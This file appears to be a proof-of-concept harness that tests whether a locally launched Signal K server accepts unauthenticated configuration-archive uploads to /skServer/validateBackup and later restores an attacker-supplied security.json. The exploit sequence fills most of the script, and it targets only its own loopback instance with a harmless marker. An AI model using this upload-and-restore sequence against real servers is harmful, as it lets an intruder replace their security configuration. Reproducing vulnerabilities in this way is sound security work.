#!/usr/bin/env python3
"""
Self-contained PoC driver for a Signal K server.

The server exposes a web interface that manages its own configuration data,
including importing configuration archives (multipart upload of a ".backup"
zip) and applying an imported archive's contents to the server's runtime
configuration storage (copying a whitelisted set of files into the config
directory).

The vulnerability being exercised is that the archive-import endpoint is not
behind any authentication middleware, while the archive-apply endpoint is.
This driver therefore:

  1. Launches the server with a controlled environment (PORT, ADMINUSER,
     SIGNALK_NODE_CONFIG_DIR).
  2. Logs in through the service's own /login endpoint to obtain a session
     token (never using a pre-provisioned account).
  3. Uploads an attacker-supplied configuration archive WITHOUT any session or
     authorization credentials.
  4. Applies the imported archive's contents using the authenticated session.
  5. Observes whether attacker-supplied content landed in the config directory.

The script never hardcodes which outcome will occur: it runs the interaction,
observes the server's behaviour, and reports it via the fixed JSON contract.
Rejections are legitimate outcomes, not errors.
"""

import argparse
import http.client
import io
import json
import os
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import time
import uuid
import zipfile

STDOUT_LIMIT = 200_000
LOG_TAIL_LIMIT = 4000


def free_port():
    """Return a free loopback TCP port."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def wait_for_server(proc, port, deadline):
    """Wait until the child process serves HTTP on the loopback port."""
    while time.monotonic() < deadline:
        if proc.poll() is not None:
            return False
        try:
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=1.0)
            conn.request("GET", "/loginStatus")
            resp = conn.getresponse()
            resp.read()
            conn.close()
            return True
        except Exception:
            time.sleep(0.15)
    return False


def http_request(port, method, path, body=None, headers=None, timeout=10.0):
    """Perform a single HTTP request and return (status, body_bytes, reason)."""
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=timeout)
    conn.request(method, path, body=body, headers=headers or {})
    resp = conn.getresponse()
    data = resp.read()
    reason = resp.reason
    conn.close()
    return resp.status, data, reason


def find_marker_file(config_dir, marker):
    """Return (path, content_str) of the first file containing the marker."""
    if not os.path.isdir(config_dir):
        return None, None
    try:
        names = sorted(os.listdir(config_dir))
    except OSError:
        return None, None
    for name in names:
        full = os.path.join(config_dir, name)
        if not os.path.isfile(full):
            continue
        try:
            raw = open(full, "rb").read()
        except OSError:
            continue
        if marker.encode("utf-8") in raw:
            try:
                content = raw.decode("utf-8")
            except UnicodeDecodeError:
                content = raw.decode("latin-1", errors="replace")
            return full, content
    return None, None


def build_multipart(zip_bytes, boundary, filename):
    parts = []
    parts.append(
        "--{0}\r\nContent-Disposition: form-data; name=\"file\"; "
        "filename=\"{1}\"\r\nContent-Type: application/zip\r\n\r\n".format(
            boundary, filename
        ).encode("utf-8")
    )
    parts.append(zip_bytes)
    parts.append(("\r\n--{0}--\r\n".format(boundary)).encode("utf-8"))
    return b"".join(parts)


def run(binary, timeout):
    timeout = timeout
    start = time.monotonic()
    deadline = start + timeout

    result = {
        "binary": binary,
        "command": [binary],
        "returncode": 0,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {
            "kind": "custom",
            "value": "",
            "path": None,
        },
        "error": None,
    }

    # ---- Observable state -------------------------------------------------
    triggered = False
    import_http = 0
    apply_http = 0
    config_replaced = False
    marker = "SIGNALKPOC_" + uuid.uuid4().hex[:16]
    config_content = None
    server_log_tail = ""

    proc = None
    config_dir = None
    launched = False

    try:
        # 1. Generate admin credentials and a fresh config directory.
        username = "pocadmin_" + uuid.uuid4().hex[:6]
        password = uuid.uuid4().hex[:16]
        config_dir = tempfile.mkdtemp(prefix="sk-poc-cfg-")
        port = free_port()

        env = dict(os.environ)
        env["PORT"] = str(port)
        env["ADMINUSER"] = "%s:%s" % (username, password)
        env["SIGNALK_NODE_CONFIG_DIR"] = config_dir

        # 2. Launch the server. Try the binary directly first; if that does
        #    not produce a listening HTTP service, fall back to running the
        #    bundled node runtime against the server's bundled entrypoint.
        #    Both attempts use the same controlled environment.
        candidates = [[binary]]
        binary_dir = os.path.dirname(os.path.abspath(binary))
        bundled_node = os.path.join(binary_dir, "node")
        bundled_entry = os.path.join(binary_dir, "approot", "dist", "config", "index.bundle.cjs")
        if os.path.isfile(bundled_node) and os.path.isfile(bundled_entry):
            candidates.append([bundled_node, bundled_entry])

        for command in candidates:
            if time.monotonic() >= deadline:
                break
            try:
                proc = subprocess.Popen(
                    command,
                    env=env,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
            except OSError as exc:
                proc = None
                result["error"] = "could not start server: %s" % exc
                continue
            if wait_for_server(proc, port, deadline):
                launched = True
                result["command"] = command
                break
            # This candidate did not come up; terminate and try the next.
            try:
                proc.send_signal(signal.SIGTERM)
                proc.wait(timeout=3)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
            proc = None

        if not launched:
            result["error"] = result["error"] or "server did not start listening"
            return result

        # 3. Build the attacker-supplied configuration archive in memory.
        #    security.json is one of the files the server's restore flow will
        #    copy out of an imported archive into the config directory. The
        #    marker is embedded so we can detect it landing on disk.
        security_doc = {
            "security": {"strategy": "./tokensecurity"},
            "marker": marker,
        }
        zip_buf = io.BytesIO()
        with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("security.json", json.dumps(security_doc))
        zip_bytes = zip_buf.getvalue()

        boundary = "----pocboundary%s" % uuid.uuid4().hex
        multipart = build_multipart(zip_bytes, boundary, "signalk-poc.backup")

        # 4. Import the archive WITHOUT any authentication.
        import_http, _import_body, _reason = http_request(
            port,
            "POST",
            "/skServer/validateBackup",
            body=multipart,
            headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary},
        )

        # 5. Obtain a session token via the service's own login endpoint.
        token = None
        login_status, login_body, _reason = http_request(
            port,
            "POST",
            "/login",
            body=json.dumps({"username": username, "password": password}),
            headers={"Content-Type": "application/json"},
        )
        if login_status == 200:
            try:
                token = json.loads(login_body.decode("utf-8")).get("token")
            except Exception:
                token = None

        # 6. Apply the imported archive's contents using the authenticated
        #    session. If we have no token, the apply request is sent anyway and
        #    its rejection status is recorded (it will not apply).
        apply_headers = {"Content-Type": "application/x-www-form-urlencoded"}
        if token:
            apply_headers["Authorization"] = "Bearer %s" % token
        apply_http, _apply_body, _reason = http_request(
            port,
            "POST",
            "/skServer/restore",
            body="security.json=true",
            headers=apply_headers,
        )

        # 7. Give the asynchronous restore a moment, then observe the config
        #    directory for the marker.
        end = time.monotonic() + 5.0
        while time.monotonic() < end:
            found_path, found_content = find_marker_file(config_dir, marker)
            if found_path is not None:
                config_replaced = True
                config_content = found_content
                break
            time.sleep(0.2)

        triggered = config_replaced
    except Exception as exc:  # pragma: no cover - internal failure only
        result["error"] = "internal error: %r" % (exc,)
    finally:
        # 8. Collect the child's output and clean up.
        out_txt = ""
        err_txt = ""
        if proc is not None:
            if proc.poll() is None:
                try:
                    proc.send_signal(signal.SIGTERM)
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    try:
                        proc.kill()
                        proc.wait(timeout=5)
                    except Exception:
                        pass
                except Exception:
                    pass
            try:
                out_txt = proc.stdout.read().decode("utf-8", errors="replace") if proc.stdout else ""
            except Exception:
                out_txt = ""
            try:
                err_txt = proc.stderr.read().decode("utf-8", errors="replace") if proc.stderr else ""
            except Exception:
                err_txt = ""
            result["returncode"] = proc.poll() if proc.poll() is not None else 0
            if proc.returncode is not None and proc.returncode < 0:
                signame = None
                try:
                    signame = signal.Signals(-proc.returncode).name
                except Exception:
                    signame = str(-proc.returncode)
                result["signal"] = signame

        if config_dir is not None:
            try:
                shutil.rmtree(config_dir, ignore_errors=True)
            except Exception:
                pass

    # ---- Compose the normalized evidence ---------------------------------
    combined_log = (out_txt + "\n" + err_txt).strip()
    server_log_tail = combined_log[-LOG_TAIL_LIMIT:]

    observable = {
        "triggered": bool(triggered),
        "import_http": int(import_http),
        "apply_http": int(apply_http),
        "config_replaced": bool(config_replaced),
        "marker": marker,
        "config_content": config_content,
        "server_log_tail": server_log_tail,
    }
    result["observable"]["value"] = json.dumps(observable, sort_keys=True)

    result["runtime_ms"] = int((time.monotonic() - start) * 1000)
    if time.monotonic() >= deadline and not launched:
        result["timed_out"] = True

    result["stdout"] = out_txt[:STDOUT_LIMIT]
    result["stderr"] = err_txt[:STDOUT_LIMIT]

    return result


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", required=True)
    parser.add_argument("--json-out", default=None)
    parser.add_argument("--timeout", type=float, default=90.0)
    args = parser.parse_args()

    result = run(args.binary, args.timeout)

    output = json.dumps(result)
    if args.json_out:
        with open(args.json_out, "w") as fh:
            fh.write(output + "\n")
    else:
        print(output)


if __name__ == "__main__":
    main()
